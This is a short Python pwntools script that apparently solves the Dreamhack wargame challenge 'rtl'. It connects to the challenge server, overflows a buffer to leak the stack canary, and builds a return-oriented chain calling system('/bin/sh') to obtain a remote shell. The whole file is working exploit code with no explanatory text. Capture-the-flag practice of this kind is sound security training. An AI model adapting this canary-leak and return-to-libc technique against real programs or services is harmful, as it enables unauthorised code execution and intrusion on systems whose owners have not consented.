from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

#p = process("./rtl")
p = remote("host3.dreamhack.games", 8444)
e = ELF("./rtl")
r = ROP("./rtl")

payload = b''
payload += b'A'*57

p.recvuntil(b"Buf: ")
p.send(payload)

p.recvuntil(payload)
canary = u64(b"\x00" + p.recvn(7))
slog("canary", canary)

system_plt = e.plt["system"]
slog("system", system_plt)

binsh = next(e.search(b"/bin/sh"))
slog("binsh", binsh)

pop_ret = r.find_gadget(["pop rdi"])[0]
ret = r.find_gadget(["ret"])[0]
slog("pop_ret", pop_ret)
slog("ret", ret)

payload = b""
payload += b"A"*56
payload += p64(canary)
payload += b"A"*8
payload += p64(pop_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_plt)

p.recvuntil(b"Buf: ")
p.send(payload)

p.interactive()
